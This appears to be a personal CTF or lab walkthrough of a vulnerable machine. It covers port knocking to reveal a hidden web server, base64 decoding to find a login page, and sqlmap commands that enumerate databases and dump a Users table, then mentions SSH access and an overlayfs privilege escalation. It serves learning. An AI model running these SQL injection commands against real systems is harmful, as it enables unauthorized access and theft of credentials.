Port knocking is a process of knocking the secquence of ports in order to open a new process or the new port
in this scenerio i if we knock the ports 1,2,3 ==> leads to a new http web server hosted in the hidden machine.

enumiration of directories had given some stuff but a lead is there is the directory "/geoda" cant be found with any wordlists as of now

there is page in the directory containing the base64 encoded text and the decode output twice [*2] gives /978345210/index.php as the username password directory. 

now i have to enumirate the usernmame and password inorder to get access to the machine


enumirating the username and password using sqlmap [because the site is vulnerable to the sql injection ]
sqlmap -u 'http://10.38.1.117:1337/978345210/index.php' --data='username=username&password=password&submit=' --level=5 --risk=3
sqlmap -u 'http://10.38.1.117:1337/978345210/index.php' --data='username=username&password=password&submit=' --level=5 --risk=3 --dbs
	> Outputs ->
		available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp

sqlmap -u 'http://10.38.1.117:1337/978345210/index.php' --data='username=username&password=password&submit=' --level=5 --risk=3 -D Webapp -T Users --dump

	> Output ->
Database: Webapp
Table: Users
[5 entries]

login to ssh for the user (2) and the version used by ubuntu is something which is vulnerable to overlayfs.

Further learning :
1 ->  Learn the exploit what overlayfs mean
2 ->  Learn SQL injection and sql map		
3 ->  Port knocking , how do we automatically test a set of ports and sequences to unlock the hidden ports.
